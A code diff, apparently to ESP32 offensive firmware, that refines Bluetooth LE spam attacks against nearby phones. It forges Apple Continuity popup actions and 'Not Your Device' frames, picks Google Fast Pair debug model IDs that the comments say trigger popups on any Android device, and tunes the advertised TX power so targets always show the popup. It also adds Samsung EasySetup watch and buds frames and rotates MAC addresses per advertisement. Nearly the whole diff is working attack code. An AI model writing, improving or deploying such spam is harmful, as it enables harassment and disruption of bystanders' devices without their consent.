@@ -157,6 +157,15 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
         uint8_t apple_r = random(10);
         if (apple_r < 4) {
           // --- ContinuityAction (Modal popup) ---
+          const uint8_t action_types[] = {
+            0x13, 0x27, 0x20, 0x19, 0x1E, 0x09, 0x02, 0x0B,
+            0x01, 0x06, 0x0D, 0x2B, 0x05, 0x24, 0x2F, 0x21
+          };
+          uint8_t act = action_types[rand() % sizeof(action_types)];
+          uint8_t aflag = 0xC0;
+          if (act == 0x21) aflag = 0x40;
+          else if (act == 0x20 && (random(2) == 0)) aflag = 0xBF;
+          else if (act == 0x09 && (random(2) == 0)) aflag = 0x40;
           AdvData_Raw = new uint8_t[11];
           AdvData_Raw[i++] = 0x0A;
           AdvData_Raw[i++] = 0xFF;
@@ -164,14 +173,8 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
           AdvData_Raw[i++] = 0x00;
           AdvData_Raw[i++] = 0x0F;
           AdvData_Raw[i++] = 0x05;
-          AdvData_Raw[i++] = 0xC0;
-          // Expanded Apple Continuity NearbyAction list (produces modal popup on iOS)
-          const uint8_t action_types[] = {
-            0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20,
-            0x04, 0x05, 0x07, 0x08, 0x0B, 0x0C, 0x0D,
-            0x11, 0x13, 0x14, 0x17, 0x1B, 0x1F, 0x29, 0x2D
-          };
-          AdvData_Raw[i++] = action_types[rand() % sizeof(action_types)];
+          AdvData_Raw[i++] = aflag;
+          AdvData_Raw[i++] = act;
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
           AdvData_Raw[i++] = (uint8_t)random(256);
@@ -183,35 +186,34 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
           break;
         }
         else if (apple_r < 6) {
-          // --- NotYourDevice / Devices ---
-          AdvData_Raw = new uint8_t[21];
-          AdvData_Raw[i++] = 0x14;
+          // --- NotYourDevice (prefix=0x01, simondankelmann parity) ---
+          const uint16_t notyour_types[] = {
+            0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420,
+            0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120,
+            0x0520, 0x0920, 0x1720, 0x1220, 0x1620
+          };
+          uint16_t ntype = notyour_types[rand() % (sizeof(notyour_types) / sizeof(notyour_types[0]))];
+          AdvData_Raw = new uint8_t[31];
+          AdvData_Raw[i++] = 0x1E;
           AdvData_Raw[i++] = 0xFF;
           AdvData_Raw[i++] = 0x4C;
           AdvData_Raw[i++] = 0x00;
-          AdvData_Raw[i++] = 0x07;
-          AdvData_Raw[i++] = 0x0F;
+          AdvData_Raw[i++] = 0x07;  // ProximityPair
+          AdvData_Raw[i++] = 0x19;  // payload size = 25
+          AdvData_Raw[i++] = 0x01;  // prefix = NOT YOUR DEVICE
+          AdvData_Raw[i++] = (uint8_t)((ntype >> 8) & 0xFF);
+          AdvData_Raw[i++] = (uint8_t)(ntype & 0xFF);
+          AdvData_Raw[i++] = 0x55;                  // status
+          AdvData_Raw[i++] = (uint8_t)random(256);  // buds battery
+          AdvData_Raw[i++] = (uint8_t)random(256);  // case battery
+          AdvData_Raw[i++] = (uint8_t)random(256);  // lid open count
+          AdvData_Raw[i++] = 0x00;                  // color
           AdvData_Raw[i++] = 0x00;
-          const uint16_t notyour_types[] = {0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20, 0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620};
-          uint16_t ntype = notyour_types[rand() % (sizeof(notyour_types) / sizeof(notyour_types[0]))];
-          AdvData_Raw[i++] = (uint8_t)((ntype >> 0x08) & 0xFF);
-          AdvData_Raw[i++] = (uint8_t)((ntype >> 0x00) & 0xFF);
-          AdvData_Raw[i++] = 0xAC;
-          AdvData_Raw[i++] = 0x90;
-          AdvData_Raw[i++] = 0x85;
-          AdvData_Raw[i++] = 0x75;
-          AdvData_Raw[i++] = 0x94;
-          AdvData_Raw[i++] = 0x65;
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = (uint8_t)random(256);
-          AdvData_Raw[i++] = 0x00;
+          for (int k = 0; k < 16; k++) AdvData_Raw[i++] = (uint8_t)random(256);
           #ifndef HAS_NIMBLE_2
-            AdvData.addData(std::string((char *)AdvData_Raw, 21));
+            AdvData.addData(std::string((char *)AdvData_Raw, 31));
           #else
-            AdvData.addData(AdvData_Raw, 21);
+            AdvData.addData(AdvData_Raw, 31);
           #endif
           break;
         }
@@ -343,9 +345,27 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
       case Google: {
         AdvData_Raw = new uint8_t[14];
         uint8_t mid0, mid1, mid2;
-        // 10% chance: emit FastPair Debug Mode frame (triggers debug popup on Android)
-        if ((rand() % 10) == 0) {
-          mid0 = 0x0A; mid1 = 0x00; mid2 = 0x7F;  // Debug model ID 0x0A007F
+        // Google-approved debug/test model IDs trigger popup on ALL Android devices
+        // (no Developer Mode required), unlike unregistered IDs.
+        static const uint8_t fp_debug[][3] = {
+          {0x08,0x00,0x00}, // Foocorp Foophones
+          {0x09,0x00,0x00}, // Test Android TV
+          {0x0A,0x00,0x00}, // Test Anti-Spoofing
+          {0x0A,0x00,0x7F}, // FastPair Debug Mode
+          {0x0B,0x00,0x00}, // Google Gphones
+          {0x0C,0x00,0x00}, // Google Gphones
+          {0x35,0x00,0x00}, // Test 000035
+          {0x47,0x00,0x00}, // Arduino 101
+          {0x48,0x00,0x00}, // Fast Pair Headphones
+          {0x49,0x00,0x00}, // Fast Pair Headphones
+        };
+        static const uint8_t fp_debug_count = sizeof(fp_debug) / 3;
+        // 60% debug IDs (trigger on any Android), 40% genuine registered IDs
+        if ((rand() % 10) < 6) {
+          uint8_t di = rand() % fp_debug_count;
+          mid0 = fp_debug[di][0];
+          mid1 = fp_debug[di][1];
+          mid2 = fp_debug[di][2];
         } else {
           uint16_t fp_idx = random(g_fastpair_count);
           mid0 = g_fastpair_models[fp_idx][0];
@@ -367,10 +387,11 @@ static const uint16_t g_fastpair_count = sizeof(g_fastpair_models) / 3;
 
         AdvData_Raw[i++] = 2;
         AdvData_Raw[i++] = 0x0A;
-        // Fake "very close" distance: advertise low TX power while radio runs at max.
-        // Receiver computes path loss = adv_tx - RSSI; a low advertised TX vs strong
-        // RSSI makes the target infer the spoofed device is right next to it.
-        AdvData_Raw[i++] = (int8_t)(-80 + (rand() % 41)); // -80 .. -40 dBm
+        // path_loss = adv_TxPower - RSSI. Typical RSSI at 1m ≈ -65 dBm.
+        // +9 dBm → path_loss 74 dBm → ~15m → popup suppressed.
+        // -60 dBm → path_loss 5 dBm → ~0.1m → popup always fires.
+        // Range -60..+5 covers close to medium-far while keeping most packets popup-eligible.
+        AdvData_Raw[i++] = (int8_t)(-60 + (rand() % 66)); // -60 .. +5 dBm
 
         #ifndef HAS_NIMBLE_2
           AdvData.addData(std::string((char *)AdvData_Raw, 14));
@@ -2533,7 +2554,7 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color) {
       RunSourApple(scan_mode, color);
     #endif
   }
-  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
+  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) ||
            (scan_mode == BT_ATTACK_SPAM_ALL) ||
            (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
            (scan_mode == BT_ATTACK_GOOGLE_SPAM) ||
@@ -3289,7 +3310,7 @@ String WiFiScan::security_int_to_string(int security_type) {
       authtype = "[WPA3_PSK]";
       break;
 
-    #ifdef HAS_IDF_3
+    #if defined(HAS_IDF_3) && defined(WIFI_AUTH_WPA3_ENTERPRISE)
     case WIFI_AUTH_WPA3_ENTERPRISE:
       authtype = "[WPA3]";
       break;
@@ -4782,6 +4803,7 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         pAdvertising = pServer->getAdvertising();
         pAdvertising->setMinInterval(0x20);
         pAdvertising->setMaxInterval(0x20);
+        pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
         this->ble_initialized = true;
       }
 
@@ -4863,22 +4885,30 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
         pAdvertising = pServer->getAdvertising();
         pAdvertising->setMinInterval(0x20);
         pAdvertising->setMaxInterval(0x20);
+        pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
         this->ble_initialized = true;
         Serial.println("[SSpam] init once (watch+buds)");
       }
 
+      // Buds scan response: Samsung zeros, 14 bytes after company ID (simondankelmann parity)
+      static const uint8_t buds_sr[18] = {
+        0x11, 0xFF, 0x75, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+      };
+
       // Burst 6 ads per call: 3 watches + 3 buds, alternating
       for (uint8_t n = 0; n < 6; n++) {
-        // Rotate MAC per advertisement (random static address: top 2 bits = 11)
         uint8_t rmac[6];
         generateRandomMac(rmac);
         rmac[5] |= 0xC0;
         NimBLEDevice::setOwnAddr(rmac);
 
+        NimBLEAdvertisementData sd;
         NimBLEAdvertisementData ad;
 
         if ((n & 1) == 0) {
-          // --- EasySetup Watch (15-byte AdvData) ---
+          // --- EasySetup Watch (15-byte AdvData, no scan response) ---
           uint8_t idx = s_samsung_watch_cursor;
           s_samsung_watch_cursor = (s_samsung_watch_cursor + 1) % 26;
           uint8_t model_val = watch_models[idx].value;
@@ -4896,44 +4926,48 @@ void WiFiScan::executeBLESpam(EBLEPayloadType type) {
           raw[p++] = 0x43;
           raw[p++] = model_val;
 
+          // Empty scan response to clear Buds SR from previous iteration
+          pAdvertising->setScanResponseData(sd);
           #ifndef HAS_NIMBLE_2
             ad.addData(std::string((char *)raw, 15));
           #else
             ad.addData(raw, 15);
           #endif
 
-          if ((s_samsung_calls == 1) && n < 2) {
+          if ((s_samsung_calls == 1) && n < 2)
             Serial.printf("[SSpam] WATCH n=%u idx=%u mv=0x%02X\n", n, idx, model_val);
-          }
         } else {
-          // --- EasySetup Buds (28-byte AdvData) ---
+          // --- EasySetup Buds (28-byte AdvData + scan response) ---
           uint8_t idx = s_samsung_buds_cursor;
           s_samsung_buds_cursor = (s_samsung_buds_cursor + 1) % 20;
           const uint8_t *id = buds_models[idx];
 
           uint8_t raw[28];
           uint8_t p = 0;
-          raw[p++] = 27;          // length
-          raw[p++] = 0xFF;        // Manufacturer Specific Data
-          raw[p++] = 0x75; raw[p++] = 0x00;  // Samsung
-          // prepended: 42 09 81 02 14 15 03 21 01 09
+          raw[p++] = 27;
+          raw[p++] = 0xFF;
+          raw[p++] = 0x75; raw[p++] = 0x00;
           raw[p++] = 0x42; raw[p++] = 0x09; raw[p++] = 0x81; raw[p++] = 0x02; raw[p++] = 0x14;
           raw[p++] = 0x15; raw[p++] = 0x03; raw[p++] = 0x21; raw[p++] = 0x01; raw[p++] = 0x09;
-          // device id expanded: id0 id1 01 id2
           raw[p++] = id[0]; raw[p++] = id[1]; raw[p++] = 0x01; raw[p++] = id[2];
-          // appended: 06 3C 94 8E 00 00 00 00 C7 00
           raw[p++] = 0x06; raw[p++] = 0x3C; raw[p++] = 0x94; raw[p++] = 0x8E; raw[p++] = 0x00;
           raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0x00; raw[p++] = 0xC7; raw[p++] = 0x00;
 
+          // Scan response must be set before advertisement data
+          #ifndef HAS_NIMBLE_2
+            sd.addData(std::string((char *)buds_sr, 18));
+          #else
+            sd.addData(buds_sr, 18);
+          #endif
+          pAdvertising->setScanResponseData(sd);
           #ifndef HAS_NIMBLE_2
             ad.addData(std::string((char *)raw, 28));
           #else
             ad.addData(raw, 28);
           #endif
 
-          if ((s_samsung_calls == 1) && n < 3) {
+          if ((s_samsung_calls == 1) && n < 3)
             Serial.printf("[SSpam] BUDS  n=%u idx=%u id=%02X%02X%02X\n", n, idx, id[0], id[1], id[2]);
-          }
         }
 
         pAdvertising->setAdvertisementData(ad);
